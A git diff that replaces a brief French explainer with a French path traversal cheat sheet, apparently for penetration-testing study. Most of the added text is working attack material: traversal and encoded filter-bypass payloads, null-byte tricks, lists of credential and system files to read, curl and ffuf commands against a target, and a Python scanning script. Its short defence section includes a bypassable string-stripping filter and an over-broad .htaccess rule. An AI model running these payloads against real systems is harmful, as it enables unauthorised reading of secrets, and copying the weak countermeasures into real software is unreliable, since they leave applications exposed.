@@ -1,37 +1,338 @@
 ---
 title: Path Traversal
-date: "2025-07-20"
+date: "2025-07-15"
 draft: false
 ---
 
-# 📁 Path Traversal
+# 📂 Path Traversal - Cheat Sheet
 
-## Qu'est-ce que la traversée de répertoires ?
-
-La traversée de répertoires (Path Traversal) est une vulnérabilité qui permet à un attaquant d'accéder à des fichiers ou dossiers en dehors du répertoire prévu par l'application, en manipulant les chemins d'accès (ex : `../../etc/passwd`).
-
-## 🎯 Objectifs pédagogiques
-- Comprendre le fonctionnement d'une attaque path traversal
-- Savoir détecter et exploiter cette vulnérabilité
-
-## 📋 Exemples de scénarios et commandes
-- Accéder à des fichiers sensibles via une URL vulnérable
-- Exploiter un formulaire d'upload pour lire des fichiers système
-
-## 🛠️ Outils et commandes les plus utilisés
-- **curl / Burp Suite** : Tester les chemins d'accès
-- **wfuzz / ffuf** : Fuzzer les chemins vulnérables
-
-## 🛡️ Bonnes pratiques
-- Normaliser et valider les chemins d'accès côté serveur
-- Restreindre les permissions de lecture/écriture
-- Utiliser des fonctions sécurisées pour la gestion des fichiers
-
-## 📚 Ressources utiles
-- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
-- [HackTricks - Path Traversal](https://book.hacktricks.xyz/pentesting-web/path-traversal)
-- [PayloadsAllTheThings - Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#path-traversal)
+## 🎯 Vue d'ensemble
+Les vulnérabilités de path traversal (ou directory traversal) permettent d'accéder à des fichiers en dehors du répertoire prévu en manipulant les chemins de fichiers.
 
 ---
 
-_Dernière mise à jour : 20 juillet 2025_ 
+## 🔍 Détection et Énumération
+
+### Identification des Points d'Entrée
+```bash
+# Paramètres sensibles à tester
+# Pourquoi : Ces paramètres sont souvent utilisés pour accéder aux fichiers
+file=document.pdf
+page=about.html
+include=header.php
+load=config.php
+path=/var/www/html/
+```
+
+### Tests de Base
+```bash
+# Tests simples de path traversal
+# Pourquoi : Vérifier si l'application est vulnérable aux traversées de répertoire
+../../../etc/passwd
+..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+```
+
+---
+
+## 🛠️ Techniques d'Exploitation
+
+### Séquences de Traversal
+```bash
+# Séquences Unix/Linux
+# Pourquoi : Naviguer vers les répertoires parents sur les systèmes Unix
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+
+# Séquences Windows
+# Pourquoi : Naviguer vers les répertoires parents sur Windows
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\system32\drivers\etc\hosts
+```
+
+### Encodage et Obfuscation
+```bash
+# Encodage URL
+# Pourquoi : Contourner les filtres qui bloquent les caractères spéciaux
+..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+
+# Encodage double
+# Pourquoi : Contourner les filtres qui décodent une seule fois
+..%252F..%252F..%252Fetc%252Fpasswd
+..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
+
+# Encodage hexadécimal
+# Pourquoi : Utiliser des représentations hexadécimales des caractères
+..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd
+```
+
+### Techniques Avancées
+```bash
+# Null byte injection
+# Pourquoi : Tronquer le chemin après le null byte
+../../../etc/passwd%00.jpg
+..\..\..\windows\system32\drivers\etc\hosts%00.txt
+
+# Caractères spéciaux
+# Pourquoi : Utiliser des caractères alternatifs pour les séparateurs
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+```
+
+---
+
+## 🌐 Exploitation Web
+
+### Paramètres GET
+```bash
+# Exemples d'URLs vulnérables
+# Pourquoi : Tester différents paramètres qui peuvent être vulnérables
+http://target.com/file.php?file=../../../etc/passwd
+http://target.com/include.php?page=../../../../etc/passwd
+http://target.com/download.php?path=..\..\..\windows\system32\drivers\etc\hosts
+```
+
+### Paramètres POST
+```bash
+# Requêtes POST
+# Pourquoi : Tester les paramètres dans les requêtes POST
+curl -X POST -d "file=../../../etc/passwd" http://target.com/file.php
+curl -X POST -d "include=../../../../etc/passwd" http://target.com/include.php
+```
+
+### Headers HTTP
+```bash
+# Headers personnalisés
+# Pourquoi : Certaines applications utilisent des headers pour les chemins
+curl -H "X-File-Path: ../../../etc/passwd" http://target.com/file.php
+curl -H "X-Include-Path: ../../../../etc/passwd" http://target.com/include.php
+```
+
+---
+
+## 📁 Fichiers à Cibler
+
+### Fichiers Système Unix/Linux
+```bash
+# Fichiers de configuration système
+# Pourquoi : Obtenir des informations sensibles sur le système
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/fstab
+/etc/motd
+/etc/issue
+
+# Fichiers de logs
+# Pourquoi : Obtenir des informations sur l'activité du système
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/var/log/syslog
+
+# Fichiers de configuration web
+# Pourquoi : Obtenir des informations sur la configuration du serveur web
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/php/php.ini
+```
+
+### Fichiers Système Windows
+```bash
+# Fichiers de configuration Windows
+# Pourquoi : Obtenir des informations sur la configuration Windows
+C:\windows\system32\drivers\etc\hosts
+C:\windows\system32\config\sam
+C:\windows\system32\config\system
+C:\windows\win.ini
+C:\windows\system.ini
+
+# Fichiers de logs Windows
+# Pourquoi : Obtenir des informations sur l'activité Windows
+C:\windows\system32\winevt\logs\Application.evtx
+C:\windows\system32\winevt\logs\Security.evtx
+C:\windows\system32\winevt\logs\System.evtx
+```
+
+### Fichiers d'Application
+```bash
+# Fichiers de configuration d'application
+# Pourquoi : Obtenir des informations sur la configuration de l'application
+config.php
+config.ini
+.env
+database.yml
+web.config
+```
+
+---
+
+## 🔧 Outils d'Exploitation
+
+### Burp Suite
+```bash
+# Intercepter et modifier les requêtes
+# Pourquoi : Analyser et manipuler les paramètres de chemin
+# 1. Intercepter la requête
+# 2. Modifier le paramètre de fichier
+# 3. Envoyer la requête modifiée
+
+# Exemple de modification
+# Paramètre original: file=document.pdf
+# Paramètre modifié: file=../../../etc/passwd
+```
+
+### FFUF
+```bash
+# Fuzzer les chemins
+# Pourquoi : Automatiser les tests de path traversal
+ffuf -u "http://target.com/file.php?file=FUZZ" \
+     -w path-traversal-payloads.txt \
+     -mr "root:"
+
+# Liste de payloads
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+```
+
+### Custom Scripts
+```python
+#!/usr/bin/env python3
+# Script de test de path traversal
+# Pourquoi : Automatiser les tests de path traversal
+
+import requests
+
+def test_path_traversal(url, param, payloads):
+    for payload in payloads:
+        params = {param: payload}
+        response = requests.get(url, params=params)
+        if "root:" in response.text or "error" not in response.text:
+            print(f"Vulnérable: {payload}")
+            print(f"Response: {response.text[:200]}")
+```
+
+---
+
+## 🎯 Techniques Avancées
+
+### Bypass de Filtres
+```bash
+# Contourner les filtres de séquences
+# Pourquoi : Éviter la détection des séquences de traversal
+....//....//....//etc/passwd
+..%2e%2e%2f..%2e%2e%2f..%2e%2e%2fetc%2fpasswd
+..%252e%252e%252f..%252e%252e%252f..%252e%252e%252fetc%252fpasswd
+
+# Utiliser des caractères Unicode
+# Pourquoi : Contourner les filtres qui ne gèrent pas l'Unicode
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+```
+
+### Techniques de Contournement
+```bash
+# Utiliser des chemins absolus
+# Pourquoi : Contourner les restrictions sur les chemins relatifs
+/etc/passwd
+C:\windows\system32\drivers\etc\hosts
+
+# Utiliser des liens symboliques
+# Pourquoi : Accéder à des fichiers via des liens
+/var/www/html/symlink -> /etc/passwd
+```
+
+---
+
+## 🔍 Post-Exploitation
+
+### Lecture de Fichiers
+```bash
+# Lire des fichiers sensibles
+# Pourquoi : Obtenir des informations sensibles sur le système
+curl "http://target.com/file.php?file=../../../etc/passwd"
+wget "http://target.com/include.php?page=../../../../etc/passwd"
+
+# Lire des fichiers de configuration
+# Pourquoi : Obtenir des informations sur la configuration
+curl "http://target.com/file.php?file=../../../config.php"
+curl "http://target.com/file.php?file=../../../.env"
+```
+
+### Énumération de Répertoires
+```bash
+# Lister les répertoires
+# Pourquoi : Découvrir la structure du système de fichiers
+curl "http://target.com/file.php?file=../../../"
+curl "http://target.com/file.php?file=../../../../"
+
+# Naviguer dans les répertoires
+# Pourquoi : Explorer le système de fichiers
+curl "http://target.com/file.php?file=../../../var/www/html/"
+curl "http://target.com/file.php?file=../../../home/"
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Validation des Chemins
+```php
+<?php
+// Validation stricte des chemins
+// Pourquoi : Empêcher l'accès aux fichiers en dehors du répertoire autorisé
+$file = $_GET['file'];
+$allowed_path = '/var/www/html/files/';
+$real_path = realpath($allowed_path . $file);
+
+if (strpos($real_path, $allowed_path) !== 0) {
+    die('Accès non autorisé');
+}
+?>
+```
+
+### Normalisation des Chemins
+```php
+<?php
+// Normaliser les chemins
+// Pourquoi : Éliminer les séquences de traversal
+$file = $_GET['file'];
+$file = str_replace(['../', '..\\'], '', $file);
+$file = str_replace(['..%2F', '..%5C'], '', $file);
+?>
+```
+
+### Configuration Serveur
+```apache
+# .htaccess pour restreindre l'accès
+# Pourquoi : Empêcher l'accès aux fichiers sensibles
+<Files "*.php">
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+<Files "*.ini">
+    Order Deny,Allow
+    Deny from all
+</Files>
+```
+
+---
+
+## 📚 Ressources
+
+- **OWASP Path Traversal** : https://owasp.org/www-community/attacks/Path_Traversal
+- **HackTricks Path Traversal** : https://book.hacktricks.xyz/pentesting-web/path-traversal
+- **PayloadsAllTheThings Path Traversal** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+- **Path Traversal Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
+
+---
+
+_Dernière mise à jour : 15 juillet 2025_ 
